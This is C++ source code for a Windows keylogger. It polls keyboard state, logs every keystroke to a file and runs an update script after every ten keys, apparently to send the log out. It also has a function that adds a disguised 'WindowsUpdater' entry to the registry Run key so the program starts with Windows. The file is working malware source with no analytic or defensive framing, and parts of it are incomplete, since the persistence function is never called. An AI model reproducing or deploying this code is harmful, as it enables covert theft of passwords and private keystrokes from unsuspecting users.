#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

using namespace std;

#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"
#define DEFAULT_ADDRESS "127.0.0.1"
#define CHARS_TO_UPDATE 10

void LOG(char input)
{
	fstream LogFile;
	LogFile.open("logger.txt", fstream::app);
	if (LogFile.is_open())
	{
		LogFile << input;
		LogFile.close();
	}
}

char returnPressedKey(int pressedKey)
{
	switch (pressedKey)
	{
	case VK_SPACE:
		return ' ';
		break;
	case VK_RETURN:
		return '\n';
		break;
	case VK_BACK:
		return '\b';
		break;
	default:
		if (isalnum(pressedKey) || (pressedKey >= '!' && pressedKey <= '/'))
		{
			cout << (pressedKey);

			return pressedKey;
		}
		else
		{
			return ' ';
		}
	}
	return ' ';
}

int addProgramToStartup()
{
	HKEY hkey = HKEY_CURRENT_USER;
	LPCSTR subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	LPCSTR valueName = "WindowsUpdater";
	LPCSTR value = "KeyLoggerVirus";

	LONG res = RegOpenKeyExA(hkey, subkey, 0, KEY_SET_VALUE, &hkey);
	if (res == ERROR_SUCCESS)
	{
		res = RegSetValueExA(hkey, valueName, 0, REG_SZ, (LPBYTE)value, strlen(value) + 1);
		if (res == ERROR_SUCCESS)
		{
			std::cout << "Successfully added program to Run key." << std::endl;
		}
		else
		{
			std::cout << "Error adding program to Run key. Error code: " << res << std::endl;
		}
	}
	else
	{
		std::cout << "Error opening Run key. Error code: " << res << std::endl;
	}

	RegCloseKey(hkey);
	return 0;
}

int main()
{
	ShowWindow(GetConsoleWindow(), SW_MAXIMIZE);
	char KEY = ' ';
	int keysPressed = 0;
	while (true)
	{
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767)
			{ // if key was pressed
				LOG(returnPressedKey(KEY));

				keysPressed++;
			}
		}
		if (keysPressed == CHARS_TO_UPDATE)
		{
			system("python ../updateServer.py");
			keysPressed = 0;
		}
	}

	return 0;
}